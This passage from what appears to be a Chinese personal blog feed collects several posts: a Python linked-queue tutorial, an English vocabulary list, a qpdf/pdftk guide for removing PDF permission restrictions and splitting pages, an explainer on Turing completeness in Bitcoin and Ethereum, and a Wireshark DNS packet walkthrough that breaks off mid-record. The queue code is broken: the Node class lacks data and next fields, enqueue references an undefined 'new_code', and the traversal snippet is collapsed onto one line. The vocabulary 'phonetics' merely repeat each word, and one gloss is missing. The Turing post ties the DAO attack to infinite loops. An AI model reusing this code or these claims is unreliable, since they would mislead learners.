    <content><![CDATA[<h2 id="1-什么是链式队列？"><a href="#1-什么是链式队列？" class="headerlink" title="1. 什么是链式队列？"></a><strong>1. 什么是链式队列？</strong></h2><p>链式队列是用 <strong>链表（Linked List）</strong> 实现的队列，符合 <strong>先进先出（FIFO）</strong> 的规则。就像现实中的排队：</p>
<ul>
<li><strong>入队（Enqueue）</strong>：新人排到队尾。</li>
<li><strong>出队（Dequeue）</strong>：队头的人先离开。</li>
</ul>
<h3 id="链式队列-vs-数组队列"><a href="#链式队列-vs-数组队列" class="headerlink" title="链式队列 vs 数组队列"></a><strong>链式队列 vs 数组队列</strong></h3><p>| 对比项       | 链式队列               | 数组队列        |
| ———— | ———————- | ————— |
| <strong>存储方式</strong> | 动态分配（不连续内存） | 连续内存        |
| <strong>扩容</strong>     | 灵活（无容量限制）     | 需手动扩容&#x2F;缩容 |
| <strong>适用场景</strong> | 频繁增删               | 随机访问        |</p>
<h2 id="2-链式队列的实现步骤"><a href="#2-链式队列的实现步骤" class="headerlink" title="2. 链式队列的实现步骤"></a><strong>2. 链式队列的实现步骤</strong></h2><p>我们用py代码实现</p>
<p>先定义节点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.front = <span class="literal">None</span></span><br><span class="line">        self.rear = <span class="literal">None</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>再定义队列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enqueue</span>(<span class="params">self,data</span>):</span><br><span class="line">    new_node = Node(data)</span><br><span class="line">    <span class="keyword">if</span> self.rear <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.front = self.rear = new_node</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.rear.<span class="built_in">next</span> = new_node</span><br><span class="line">        self.rear = new_code</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>出队的实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dequeue</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> self.front <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    temp = self.front</span><br><span class="line">    self.front = temp.<span class="built_in">next</span></span><br><span class="line">    <span class="keyword">if</span> self.front <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.rear = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> temp.data</span><br></pre></td></tr></table></figure>

<p>检查队头是不是空的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_empty</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> self.front <span class="keyword">is</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<h2 id="4-时间复杂度分析"><a href="#4-时间复杂度分析" class="headerlink" title="4. 时间复杂度分析"></a><strong>4. 时间复杂度分析</strong></h2><p>| 操作        | 时间复杂度 | 说明                  |
| ———– | ———- | ——————— |
| <strong>Enqueue</strong> | O(1)       | 直接修改队尾指针      |
| <strong>Dequeue</strong> | O(1)       | 直接修改队头指针      |
| <strong>IsEmpty</strong> | O(1)       | 检查 <code>front</code> 是否为空 |</p>
<h2 id="5-常见问题"><a href="#5-常见问题" class="headerlink" title="5. 常见问题"></a><strong>5. 常见问题</strong></h2><h3 id="Q1-链式队列会溢出吗？"><a href="#Q1-链式队列会溢出吗？" class="headerlink" title="Q1: 链式队列会溢出吗？"></a><strong>Q1: 链式队列会溢出吗？</strong></h3><p>不会！因为链表动态分配内存，除非系统内存耗尽。</p>
<h3 id="Q2-如何遍历链式队列？"><a href="#Q2-如何遍历链式队列？" class="headerlink" title="Q2: 如何遍历链式队列？"></a><strong>Q2: 如何遍历链式队列？</strong></h3><p>从 <code>front</code> 开始，沿着 <code>next</code> 指针逐个访问：</p>
<PYTHON>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">current = queue.frontwhile current:    print(current.data)    current = current.next</span><br></pre></td></tr></table></figure>

<h3 id="Q3-链式队列-vs-循环队列？"><a href="#Q3-链式队列-vs-循环队列？" class="headerlink" title="Q3: 链式队列 vs 循环队列？"></a><strong>Q3: 链式队列 vs 循环队列？</strong></h3><ul>
<li><strong>链式队列</strong>：无容量限制，但每次操作需动态分配内存。</li>
<li><strong>循环队列</strong>：固定容量，适合已知最大长度的场景（如操作系统任务调度）。</li>
</ul>
<hr>
<h2 id="6-实际应用场景"><a href="#6-实际应用场景" class="headerlink" title="6. 实际应用场景"></a><strong>6. 实际应用场景</strong></h2><ol>
<li><strong>消息队列</strong>：RabbitMQ、Kafka 的底层实现之一。</li>
<li><strong>CPU 任务调度</strong>：操作系统中的就绪队列。</li>
<li><strong>广度优先搜索（BFS）</strong>：图的遍历算法。</li>
</ol>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><ul>
<li><strong>链式队列</strong> &#x3D; 链表 + 队头队尾指针。</li>
<li><strong>核心操作</strong>：<code>enqueue</code>（队尾插入）、<code>dequeue</code>（队头删除）。</li>
<li><strong>优点</strong>：动态扩容、无需处理固定容量问题。</li>
</ul>
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-3-6-简单英语短文</title>
    <url>/2025/03/06/2025-3-6-%E7%AE%80%E5%8D%95%E8%8B%B1%E8%AF%AD%E7%9F%AD%E6%96%87/</url>
    <content><![CDATA[<h3 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h3><p>“Later!” The word, the voice, the attitude.</p>
<p>I’d never heard anyone use”later”to say goodbye before. It sounded harsh, curt, and dismissive, spoken with the veiled in difference of people who may not care to see or hear from you again.</p>
<p>It is the first thing I remember about him, and I can hear it still today.</p>
<p>Later!</p>
<h5 id="单词拆解"><a href="#单词拆解" class="headerlink" title="单词拆解"></a>单词拆解</h5><ul>
<li><strong>about</strong>: &#x2F;about&#x2F; - 关于</li>
<li><strong>again</strong>: &#x2F;again&#x2F; - 再次</li>
<li><strong>and</strong>: &#x2F;and&#x2F; - 和</li>
<li><strong>anyone</strong>: &#x2F;anyone&#x2F; - 任何人</li>
<li><strong>attitude</strong>: &#x2F;attitude&#x2F; - 态度</li>
<li><strong>before</strong>: &#x2F;before&#x2F; - 以前</li>
<li><strong>can</strong>: &#x2F;can&#x2F; - 能够</li>
<li><strong>care</strong>: &#x2F;care&#x2F; - 关心</li>
<li><strong>curt</strong>: &#x2F;curt&#x2F; - 简短无礼的</li>
<li><strong>dismissive</strong>: &#x2F;dismissive&#x2F; - 轻蔑的</li>
<li><strong>first</strong>: &#x2F;first&#x2F; - 第一</li>
<li><strong>from</strong>: &#x2F;from&#x2F; - 来自</li>
<li><strong>goodbye</strong>: &#x2F;goodbye&#x2F; - 再见</li>
<li><strong>harsh</strong>: &#x2F;harsh&#x2F; - 严厉的</li>
<li><strong>hear</strong>: &#x2F;hear&#x2F; - 听见</li>
<li><strong>heard</strong>: &#x2F;heard&#x2F; - 听见（hear的过去式）</li>
<li><strong>him</strong>: &#x2F;him&#x2F; - 他</li>
<li><strong>i</strong>: &#x2F;i&#x2F; - 未知</li>
<li><strong>id</strong>: &#x2F;id&#x2F; - 我（缩写）</li>
<li><strong>indifference</strong>: &#x2F;indifference&#x2F; - 冷漠</li>
<li><strong>is</strong>: &#x2F;is&#x2F; - 是</li>
<li><strong>it</strong>: &#x2F;it&#x2F; - 它</li>
<li><strong>later</strong>: &#x2F;later&#x2F; - 稍后，再见</li>
<li><strong>may</strong>: &#x2F;may&#x2F; - 可能</li>
<li><strong>never</strong>: &#x2F;never&#x2F; - 从未</li>
<li><strong>not</strong>: &#x2F;not&#x2F; - 不</li>
<li><strong>of</strong>: &#x2F;of&#x2F; - 的</li>
<li><strong>or</strong>: &#x2F;or&#x2F; - 或者</li>
<li><strong>people</strong>: &#x2F;people&#x2F; - 人们</li>
<li><strong>remember</strong>: &#x2F;remember&#x2F; - 记住</li>
<li><strong>say</strong>: &#x2F;say&#x2F; - 说</li>
<li><strong>see</strong>: &#x2F;see&#x2F; - 看见</li>
<li><strong>sounded</strong>: &#x2F;sounded&#x2F; - 听起来（sound的过去式）</li>
<li><strong>spoken</strong>: &#x2F;spoken&#x2F; - 说话（speak的过去分词）</li>
<li><strong>still</strong>: &#x2F;still&#x2F; - 仍然</li>
<li><strong>the</strong>: &#x2F;the&#x2F; - 这，那个</li>
<li><strong>thing</strong>: &#x2F;thing&#x2F; - 事情</li>
<li><strong>to</strong>: &#x2F;to&#x2F; - 去，向</li>
<li><strong>today</strong>: &#x2F;today&#x2F; - 今天</li>
<li><strong>use</strong>: &#x2F;use&#x2F; - 使用</li>
<li><strong>veiled</strong>: &#x2F;veiled&#x2F; - 含蓄的</li>
<li><strong>voice</strong>: &#x2F;voice&#x2F; - 声音</li>
<li><strong>who</strong>: &#x2F;who&#x2F; - 谁</li>
<li><strong>with</strong>: &#x2F;with&#x2F; - 与</li>
<li><strong>word</strong>: &#x2F;word&#x2F; - 单词，话语</li>
<li><strong>you</strong>: &#x2F;you&#x2F; - 你</li>
</ul>
]]></content>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-4-5-PDF解密与拆分</title>
    <url>/2025/04/04/2025-4-5-PDF%E8%A7%A3%E5%AF%86%E4%B8%8E%E6%8B%86%E5%88%86/</url>
    <content><![CDATA[<h1 id="PDF-解密与拆分操作指南"><a href="#PDF-解密与拆分操作指南" class="headerlink" title="PDF 解密与拆分操作指南"></a>PDF 解密与拆分操作指南</h1><h2 id="1-检查-PDF-加密状态"><a href="#1-检查-PDF-加密状态" class="headerlink" title="1. 检查 PDF 加密状态"></a><strong>1. 检查 PDF 加密状态</strong></h2><p>使用 <code>qpdf</code> 检查 PDF 文件的加密类型和权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qpdf --show-encryption input.pdf</span><br></pre></td></tr></table></figure>

<h3 id="输出示例"><a href="#输出示例" class="headerlink" title="输出示例"></a><strong>输出示例</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">R = 6</span><br><span class="line">P = -1324</span><br><span class="line">User password = </span><br><span class="line">extract: allowed</span><br><span class="line"><span class="built_in">print</span>: allowed</span><br><span class="line">modify anything: not allowed</span><br><span class="line">encryption method: AESv3</span><br></pre></td></tr></table></figure>

<ul>
<li>关键信息<ul>
<li>文件使用 <strong>AES-256（AESv3）加密</strong>。</li>
<li>无用户密码（<code>User password =</code>），但存在权限限制（禁止修改）。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="2-解密-PDF（移除权限限制）"><a href="#2-解密-PDF（移除权限限制）" class="headerlink" title="2. 解密 PDF（移除权限限制）"></a><strong>2. 解密 PDF（移除权限限制）</strong></h2><p>用 <code>qpdf</code> 移除加密和权限限制：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qpdf --decrypt input.pdf output_decrypted.pdf</span><br></pre></td></tr></table></figure>

<ul>
<li><p>效果</p>
<ul>
<li>生成 <code>output_decrypted.pdf</code>，文件可自由编辑、打印、复制。</li>
</ul>
</li>
<li><p>验证解密成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qpdf --show-encryption output_decrypted.pdf</span><br></pre></td></tr></table></figure>

<p>应输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Encryption: none</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="3-拆分-PDF-为单页"><a href="#3-拆分-PDF-为单页" class="headerlink" title="3. 拆分 PDF 为单页"></a><strong>3. 拆分 PDF 为单页</strong></h2><p>使用 <code>pdftk</code> 将解密后的 PDF 按页拆分为多个文件：</p>
<BASH>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pdftk output_decrypted.pdf burst output page_%02d.pdf</span><br></pre></td></tr></table></figure>

<ul>
<li>输出文件<ul>
<li><code>page_01.pdf</code>, <code>page_02.pdf</code>, …（按页码命名）。</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-4-8-图灵完备</title>
    <url>/2025/04/08/2025-4-8-%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/</url>
    <content><![CDATA[<h3 id="图灵完备性（Turing-Completeness）"><a href="#图灵完备性（Turing-Completeness）" class="headerlink" title="图灵完备性（Turing Completeness）"></a><strong>图灵完备性（Turing Completeness）</strong></h3><p><strong>定义</strong>：
 一个计算系统（编程语言、虚拟机、区块链等）如果能够模拟<strong>通用图灵机（Universal Turing Machine, UTM）</strong>，即可以计算任何可计算的问题（在有限时间和内存条件下），则称该系统是<strong>图灵完备的</strong>。</p>
<p><strong>关键特征</strong>：</p>
<ol>
<li><strong>条件分支（if-else）</strong>：支持逻辑判断。</li>
<li><strong>循环（loop）</strong>：允许重复执行代码（如 <code>while</code> 或递归）。</li>
<li><strong>无限存储（理论上）</strong>：能够处理任意规模的计算（实际受物理限制）。</li>
<li><strong>变量与状态</strong>：可修改和存储数据。</li>
</ol>
<p><strong>常见图灵完备系统</strong>：</p>
<ul>
<li>编程语言：Python、C、Java（均支持循环、递归、条件分支）。</li>
<li>区块链：以太坊（EVM）、Solana（支持智能合约的复杂逻辑）。</li>
</ul>
<hr>
<h3 id="为什么比特币不是图灵完备的？"><a href="#为什么比特币不是图灵完备的？" class="headerlink" title="为什么比特币不是图灵完备的？"></a><strong>为什么比特币不是图灵完备的？</strong></h3><p>比特币的脚本语言（<strong>Bitcoin Script</strong>）在设计上<strong>刻意限制了图灵完备性</strong>，主要出于安全性和简洁性的考虑：</p>
<h4 id="1-缺少循环和递归"><a href="#1-缺少循环和递归" class="headerlink" title="1. 缺少循环和递归"></a>1. <strong>缺少循环和递归</strong></h4><ul>
<li><strong>比特币 Script 没有循环语句</strong>（如 <code>for</code>、<code>while</code>），也没有递归调用。</li>
<li>脚本的执行步骤是<strong>线性且有限的</strong>，无法实现无限循环或复杂迭代。</li>
<li>示例：无法编写一个计算斐波那契数列的比特币脚本。</li>
</ul>
<h4 id="2-无动态跳转（No-Jumps）"><a href="#2-无动态跳转（No-Jumps）" class="headerlink" title="2. 无动态跳转（No Jumps）"></a>2. <strong>无动态跳转（No Jumps）</strong></h4><ul>
<li>脚本不支持动态跳转（如 <code>goto</code> 或函数调用），只能按顺序执行操作码（opcodes）。</li>
<li>条件分支仅通过简单的 <code>OP_IF</code>&#x2F;<code>OP_ELSE</code> 实现，且深度有限。</li>
</ul>
<h4 id="3-资源限制"><a href="#3-资源限制" class="headerlink" title="3. 资源限制"></a>3. <strong>资源限制</strong></h4><ul>
<li><strong>脚本大小限制</strong>：每个交易的脚本不能超过 10KB。</li>
<li><strong>操作码限制</strong>：禁用某些可能引发复杂计算的 opcode（如 <code>OP_MUL</code>、<code>OP_DIV</code> 早期被禁用）。</li>
<li><strong>无状态性</strong>：脚本执行后不保存中间状态，无法实现跨交易的持续计算。</li>
</ul>
<h4 id="4-安全优先设计"><a href="#4-安全优先设计" class="headerlink" title="4. 安全优先设计"></a>4. <strong>安全优先设计</strong></h4><ul>
<li>比特币的核心目标是<strong>安全、去中心化的价值转移</strong>，而非通用计算。</li>
<li>避免图灵完备性可防止：<ul>
<li><strong>无限循环攻击</strong>（如以太坊的 DAO 攻击曾因递归调用漏洞被利用）。</li>
<li><strong>计算资源滥用</strong>（比特币节点需验证所有脚本，非图灵完备保证验证速度）。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="比特币-vs-以太坊（图灵完备性对比）"><a href="#比特币-vs-以太坊（图灵完备性对比）" class="headerlink" title="比特币 vs 以太坊（图灵完备性对比）"></a><strong>比特币 vs 以太坊（图灵完备性对比）</strong></h3><p>| <strong>特性</strong>       | <strong>比特币（Bitcoin Script）</strong> | <strong>以太坊（EVM）</strong>         |
| ————– | —————————- | ————————- |
| <strong>图灵完备性</strong> | ❌ 否                         | ✅ 是                      |
| <strong>循环&#x2F;递归</strong>  | ❌ 不支持                     | ✅ 支持（<code>while</code>、递归）   |
| <strong>状态存储</strong>   | ❌ 无                         | ✅ 有（合约存储）          |
| <strong>典型用途</strong>   | 简单支付验证                 | 复杂智能合约（DeFi、NFT） |
| <strong>安全性考虑</strong> | 避免不可预测的计算           | 需防范重入攻击等漏洞      |</p>
<hr>
<h3 id="为什么图灵完备性重要？"><a href="#为什么图灵完备性重要？" class="headerlink" title="为什么图灵完备性重要？"></a><strong>为什么图灵完备性重要？</strong></h3><ul>
<li><strong>智能合约平台需要图灵完备性</strong>（如以太坊）：
允许开发者编写任意逻辑的合约（如借贷协议、去中心化交易所）。</li>
<li><strong>比特币不需要图灵完备性</strong>：
其设计目标是成为“数字黄金”，脚本仅需支持基础交易验证（如多签、时间锁）。</li>
</ul>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li>比特币的脚本语言<strong>故意非图灵完备</strong>，以保障安全性和确定性。</li>
<li>以太坊等平台通过图灵完备性实现复杂智能合约，但需承担更高的安全风险（如合约漏洞）。</li>
<li><strong>非图灵完备 ≠ 功能弱</strong>：比特币的脚本仍能实现多签、哈希锁等高级功能，只是无法运行通用程序。</li>
</ul>
]]></content>
      <tags>
        <tag>计算机科学</tag>
        <tag>web3</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-4-8-详细解释wiresharkDNS数据包</title>
    <url>/2025/04/08/2025-4-8-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8AwiresharkDNS%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
    <content><![CDATA[<h3 id="真包刨析"><a href="#真包刨析" class="headerlink" title="真包刨析"></a>真包刨析</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Frame 2: 215 bytes on wire (1720 bits), 215 bytes captured (1720 bits) on interface \Device\NPF_&#123;CD546E7A-55BC-4A77-99F8-0D39B3221883&#125;, <span class="built_in">id</span> 0</span><br><span class="line">    Section number: 1</span><br><span class="line">    Interface <span class="built_in">id</span>: 0 (\Device\NPF_&#123;CD546E7A-55BC-4A77-99F8-0D39B3221883&#125;)</span><br><span class="line">        Interface name: \Device\NPF_&#123;CD546E7A-55BC-4A77-99F8-0D39B3221883&#125;</span><br><span class="line">        Interface description: WLAN</span><br><span class="line">    Encapsulation <span class="built_in">type</span>: Ethernet (1)</span><br><span class="line">    Arrival Time: Apr  8, 2025 07:37:29.946837000 中国标准时间</span><br><span class="line">    UTC Arrival Time: Apr  7, 2025 23:37:29.946837000 UTC</span><br><span class="line">    Epoch Arrival Time: 1744069049.946837000</span><br><span class="line">    [Time <span class="built_in">shift</span> <span class="keyword">for</span> this packet: 0.000000000 seconds]</span><br><span class="line">    [Time delta from previous captured frame: 0.040862000 seconds]</span><br><span class="line">    [Time delta from previous displayed frame: 0.040862000 seconds]</span><br><span class="line">    [Time since reference or first frame: 0.040862000 seconds]</span><br><span class="line">    Frame Number: 2</span><br><span class="line">    Frame Length: 215 bytes (1720 bits)</span><br><span class="line">    Capture Length: 215 bytes (1720 bits)</span><br><span class="line">    [Frame is marked: False]</span><br><span class="line">    [Frame is ignored: False]</span><br><span class="line">    [Protocols <span class="keyword">in</span> frame: eth:ethertype:ip:udp:dns]</span><br><span class="line">    [Coloring Rule Name: UDP]</span><br><span class="line">    [Coloring Rule String: udp]</span><br></pre></td></tr></table></figure>

<h3 id="1-帧信息（Frame-2）"><a href="#1-帧信息（Frame-2）" class="headerlink" title="1. 帧信息（Frame 2）"></a><strong>1. 帧信息（Frame 2）</strong></h3><ul>
<li><strong>长度</strong>：215 字节（1720 比特），全部捕获。</li>
<li>捕获时间：<ul>
<li>UTC 时间：<code>Apr 7, 2025 23:37:29.946837000</code></li>
<li>本地时间（中国标准时间）：<code>Apr 8, 2025 07:37:29.946837000</code></li>
</ul>
</li>
<li><strong>时间差</strong>：距离前一帧 <code>0.040862</code> 秒。</li>
<li><strong>协议栈</strong>：<code>eth:ethertype:ip:udp:dns</code>（以太网 → IPv4 → UDP → DNS）。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Ethernet II, Src: 4e:7d:05:50:45:02 (4e:7d:05:50:45:02), Dst: LiteonTechno_dd:f1:c1 (c0:35:32:dd:f1:c1)</span><br><span class="line">    Destination: LiteonTechno_dd:f1:c1 (c0:35:32:dd:f1:c1)</span><br><span class="line">        .... ..0. .... .... .... .... = LG bit: Globally unique address (factory default)</span><br><span class="line">        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)</span><br><span class="line">    Source: 4e:7d:05:50:45:02 (4e:7d:05:50:45:02)</span><br><span class="line">        .... ..1. .... .... .... .... = LG bit: Locally administered address (this is NOT the factory default)</span><br><span class="line">        .... ...0 .... .... .... .... = IG bit: Individual address (unicast)</span><br><span class="line">    Type: IPv4 (0x0800)</span><br><span class="line">    [Stream index: 0]</span><br></pre></td></tr></table></figure>

<h3 id="2-以太网帧（Ethernet-II）"><a href="#2-以太网帧（Ethernet-II）" class="headerlink" title="2. 以太网帧（Ethernet II）"></a><strong>2. 以太网帧（Ethernet II）</strong></h3><ul>
<li><p>源 MAC 地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4e:7d:05:50:45:02</span><br></pre></td></tr></table></figure>

<ul>
<li>第 2 位为 <code>1</code>，表示是<strong>本地管理地址</strong>（非厂商默认地址）。</li>
</ul>
</li>
<li><p>目标 MAC 地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c0:35:32:dd:f1:c1</span><br></pre></td></tr></table></figure>

<p>（厂商为 Liteon Technology）。</p>
<ul>
<li>第 2 位为 <code>0</code>，表示是<strong>全局唯一地址</strong>（厂商分配）。</li>
</ul>
</li>
<li><p><strong>类型字段</strong>：<code>0x0800</code>，表示上层协议是 <strong>IPv4</strong>。</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Internet Protocol Version 4, Src: 192.168.234.75, Dst: 192.168.234.182</span><br><span class="line">    0100 .... = Version: 4</span><br><span class="line">    .... 0101 = Header Length: 20 bytes (5)</span><br><span class="line">    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)</span><br><span class="line">        0000 00.. = Differentiated Services Codepoint: Default (0)</span><br><span class="line">        .... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0)</span><br><span class="line">    Total Length: 201</span><br><span class="line">    Identification: 0x995d (39261)</span><br><span class="line">    010. .... = Flags: 0x2, Don&#x27;t fragment</span><br><span class="line">        0... .... = Reserved bit: Not set</span><br><span class="line">        .1.. .... = Don&#x27;t fragment: Set</span><br><span class="line">        ..0. .... = More fragments: Not set</span><br><span class="line">    ...0 0000 0000 0000 = Fragment Offset: 0</span><br><span class="line">    Time to Live: 64</span><br><span class="line">    Protocol: UDP (17)</span><br><span class="line">    Header Checksum: 0x4a73 [validation disabled]</span><br><span class="line">    [Header checksum status: Unverified]</span><br><span class="line">    Source Address: 192.168.234.75</span><br><span class="line">    Destination Address: 192.168.234.182</span><br><span class="line">    [Stream index: 0]</span><br></pre></td></tr></table></figure>

<h3 id="3-IPv4-数据包"><a href="#3-IPv4-数据包" class="headerlink" title="3. IPv4 数据包"></a><strong>3. IPv4 数据包</strong></h3><ul>
<li><strong>版本与头部长度</strong>：IPv4，头部 20 字节。</li>
<li><strong>服务类型（DSCP）</strong>：<code>0x00</code>（默认优先级，未启用 QoS）。</li>
<li><strong>标识符</strong>：<code>0x995d</code>（用于分片重组，此处未分片）。</li>
<li><strong>标志位</strong>：<code>Don&#39;t fragment (DF)</code> 置 <code>1</code>，禁止分片。</li>
<li><strong>TTL</strong>：<code>64</code>（常见于 Linux&#x2F;Windows 系统）。</li>
<li><strong>协议</strong>：<code>17</code>（UDP）。</li>
<li><strong>源 IP</strong>：<code>192.168.234.75</code>（DNS 服务器）。</li>
<li><strong>目标 IP</strong>：<code>192.168.234.182</code>（客户端）。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">User Datagram Protocol, Src Port: 53, Dst Port: 55360</span><br><span class="line">    Source Port: 53</span><br><span class="line">    Destination Port: 55360</span><br><span class="line">    Length: 181</span><br><span class="line">    Checksum: 0x2866 [unverified]</span><br><span class="line">    [Checksum Status: Unverified]</span><br><span class="line">    [Stream index: 0]</span><br><span class="line">    [Stream Packet Number: 2]</span><br><span class="line">    [Timestamps]</span><br><span class="line">        [Time since first frame: 0.040862000 seconds]</span><br><span class="line">        [Time since previous frame: 0.040862000 seconds]</span><br><span class="line">    UDP payload (173 bytes)</span><br></pre></td></tr></table></figure>

<h3 id="4-UDP-数据段"><a href="#4-UDP-数据段" class="headerlink" title="4. UDP 数据段"></a><strong>4. UDP 数据段</strong></h3><ul>
<li><strong>源端口</strong>：<code>53</code>（DNS 服务标准端口）。</li>
<li><strong>目标端口</strong>：<code>55360</code>（客户端随机端口）。</li>
<li><strong>长度</strong>：<code>181</code> 字节（UDP 头部 8 字节 + 载荷 173 字节）。</li>
<li><strong>校验和</strong>：<code>0x2866</code>（未验证）。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Domain Name System (response)</span><br><span class="line">    Transaction ID: 0x6c98</span><br><span class="line">    Flags: 0x8180 Standard query response, No error</span><br><span class="line">        1... .... .... .... = Response: Message is a response</span><br><span class="line">        .000 0... .... .... = Opcode: Standard query (0)</span><br><span class="line">        .... .0.. .... .... = Authoritative: Server is not an authority for domain</span><br><span class="line">        .... ..0. .... .... = Truncated: Message is not truncated</span><br><span class="line">        .... ...1 .... .... = Recursion desired: Do query recursively</span><br><span class="line">        .... .... 1... .... = Recursion available: Server can do recursive queries</span><br><span class="line">        .... .... .0.. .... = Z: reserved (0)</span><br><span class="line">        .... .... ..0. .... = Answer authenticated: Answer/authority portion was not authenticated by the server</span><br><span class="line">        .... .... ...0 .... = Non-authenticated data: Unacceptable</span><br><span class="line">        .... .... .... 0000 = Reply code: No error (0)</span><br><span class="line">    Questions: 1</span><br><span class="line">    Answer RRs: 8</span><br><span class="line">    Authority RRs: 0</span><br><span class="line">    Additional RRs: 0</span><br><span class="line">    Queries</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            [Name Length: 27]</span><br><span class="line">            [Label Count: 6]</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">    Answers</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.243</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.243</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.244</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.244</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.231</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.231</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.241</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.241</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.242</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.242</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.248</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.248</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.249</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN (0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.249</span><br><span class="line">        s1.hdslb.com.w.kunlunar.com: type A, class IN, addr 117.21.229.232</span><br><span class="line">            Name: s1.hdslb.com.w.kunlunar.com</span><br><span class="line">            Type: A (1) (Host Address)</span><br><span class="line">            Class: IN 